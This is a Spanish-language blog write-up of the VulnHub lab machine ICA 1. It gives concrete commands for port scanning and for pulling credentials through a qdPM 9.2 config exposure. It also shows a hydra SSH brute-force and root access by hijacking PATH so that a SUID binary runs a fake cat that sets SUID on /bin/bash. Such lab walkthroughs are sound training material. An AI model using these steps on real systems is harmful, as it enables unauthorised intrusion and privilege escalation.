---
layout: single
title: ICA 1 - VulnHub
excerpt: " According to information from our intelligence network, ICA is working on a secret project. We need to find out what the project is. Once you have the access information, send them to us. We will place a backdoor to access the system later. You just focus on what the project is. You will probably have to go through several layers of security. The Agency has full confidence that you will successfully complete this mission. Good Luck, Agent! "
date: 2022-11-15
classes: wide
header:
  teaser: /blog/assets/images/vh-writeup-ica1/ica1.jpg
  teaser_home_page: true
  icon: /blog/assets/images/vulnhub.webp
categories:
  - vulnhub
tags:  
  - hydra
  - qdpm
  - ssh
  - mysql
  - hijacking
---

According to information from our intelligence network, ICA is working on a secret project. We need to find out what the project is. Once you have the access information, send them to us. We will place a backdoor to access the system later. You just focus on what the project is. You will probably have to go through several layers of security. The Agency has full confidence that you will successfully complete this mission. Good Luck, Agent!

# Summary
- IP: 192.168.0.112
- Ports: 22,80,3306,33060
- OS: Linux (Debian )
- Services & Applications:
	-  22 -> OpenSSH 8.4p1 Debian 5
	-  80 -> Apache httpd 2.4.48
	-  3306-> MySQL 8.0.26
	-  33060 -> mysqlx?

# Recon

- Configuración de interfaz de red para que Vmware detecte la máquina en la misma red bridge:
 
 ```
 tecla E
 rw init=/bin/bash
 etc/network
 interfaces ---> corregir nombre de interfaz
 reiniciar
 ```

- Escaneo básico de puertos:

```bash
$sudo nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.129.26 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$sudo nmap -p21,80,3306,33060 -sCV 10.10.129.26 -oN targeted
```

- Escaneo básico de página web:

```bash
$nmap --script http-enum -p80 192.168.0.112 -oN webScan
```

- Buscamos exploits para qdpm 9.2:

```bash
$searchsploit qdpm 9.2
```

- Analizamos el explot "Password Exposure":

```bash
searchsploit qdpm 9.2 -x php/webapps/50176.txt

The password and connection string for the database are stored in a yml file. To access the yml file you can go to
http://<website>/core/config/databases.yml file and download.
```


- Encontramos credenciales para entrar a una base de datos:

```bash
$mysql -h 192.168.0.112 -u qdpmadmin -p
```

-  Analizamos las tablas:

```bash
show databases;
use staff;
show tables;
select * from user;
select * from login;
```

- Obtenemos usuarios potenciales y contraseñas al parecer encriptadas en base 64, guardamos los usuarios y probamos cada contraseña desencriptada para realizar ataque por fuerza bruta a SSH con hydra:

- Para desencriptar base 64;

```bash
$echo "REpjZVZ5OThXMjhZN3dMZw=" | base64 -d; echo
```

- Podemos hacer un diccionario con cada usuario y contraseña para realizar el ataque de fuerza bruta:

```bash
$hydra -L /home/dante/Vulnhub/ICA1/content/usuarios.txt -p DJceVy98W28Y7wLg ssh://192.168.0.112
```

- Encontramos credenciales SSH para dos usuarios: dexter y travis, como el usuario dexter no encontramos nada interesante; con el usuario travis encontramos la flag de usuario:

#  USER FLAG: ICA{Secret_Project}

# ESCALANDO PRIVILEGIOS:

- Hacemos sudo -l pero no encontramos nada, buscamos binarios con permisos SUID y encontramos uno curioso "/opt/get_access":

```bash
find / -perm -4000 2>/dev/null
```

- lo analizamos:

```bash
file /opt/get_access
strings /opt/get_access
```

- Nos damos cuenta que en una parte del binario ejecuta el comando cat, el cual usaremos para que ejecute un cat modificado por nosotros que crearemos en el duirectorio temp, el cual otorgará permisos SUID a la bash:
 ```bash
 touch cat
 chmod +x cat
 nano cat
 chmod u+s /bin/bash
 ```

- Modificamos el PATH para que ejecute nuestro cat y no el nativo del sistema:

```bash
echo $PATH
export PATH=/tmp:$PATH
```

- Ejecutamos el binario y la bash ahora tendrá permisos de SUID, lo que podemos comprobar y ejecutar:

```bash
ls -l /bin/bash
bash -p
```

# ROOT FLAG: ICA{Next_Generation_Self_Renewable_Genetics}
